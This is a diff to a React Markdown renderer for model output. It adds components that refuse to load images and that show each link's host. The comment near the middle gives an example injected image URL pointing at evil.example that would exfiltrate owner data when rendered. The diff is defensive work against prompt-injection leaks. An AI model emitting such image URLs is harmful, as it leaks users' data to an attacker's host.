@@ -1,4 +1,4 @@
-import { useCallback, useState, type FC } from "react";
+import { useCallback, useState, type ComponentPropsWithoutRef, type FC } from "react";
 import {
   MarkdownTextPrimitive,
   unstable_memoizeMarkdownComponents as memoizeMarkdownComponents,
@@ -49,8 +49,48 @@ const CodeHeader: FC<CodeHeaderProps> = ({ language, code }) => {
   );
 };
 
+// Text a model wrote is untrusted. A Markdown image is fetched the moment it renders, with no click, so an injected
+// `![](https://evil.example/?d=<owner data>)` would send whatever the model put in the address. Images are therefore
+// never drawn: the alt text and the host show as plain text and no `src` reaches the DOM. A link shows its full host
+// beside the label, so the label cannot hide where it goes. Raw HTML is not rendered (there is no rehype-raw), so these
+// two components are the only way model Markdown reaches a URL.
+function webHost(value: unknown): string | null {
+  if (typeof value !== "string") return null;
+  try {
+    const url = new URL(value);
+    return url.protocol === "http:" || url.protocol === "https:" ? url.host : null;
+  } catch {
+    return null;
+  }
+}
+
+const ModelImage: FC<ComponentPropsWithoutRef<"img">> = ({ src, alt }) => {
+  const host = webHost(src);
+  return (
+    <span className="text-muted-foreground">
+      {`[Image not loaded${alt ? `: ${alt}` : ""}${host ? ` (${host})` : ""}]`}
+    </span>
+  );
+};
+
+const ModelLink: FC<ComponentPropsWithoutRef<"a">> = ({ href, children }) => {
+  const host = webHost(href);
+  // Not a web address (a fragment, a mail or phone link): nothing to open from here, so only its text shows.
+  if (!host) return <span>{children}</span>;
+  return (
+    <>
+      <a href={href} target="_blank" rel="noopener noreferrer nofollow" referrerPolicy="no-referrer">
+        {children}
+      </a>{" "}
+      <span className="whitespace-nowrap text-xs text-muted-foreground">({host})</span>
+    </>
+  );
+};
+
 const defaultComponents = memoizeMarkdownComponents({
   CodeHeader,
+  img: ModelImage,
+  a: ModelLink,
   pre: ({ className, ...props }) => (
     <pre
       className={cn(
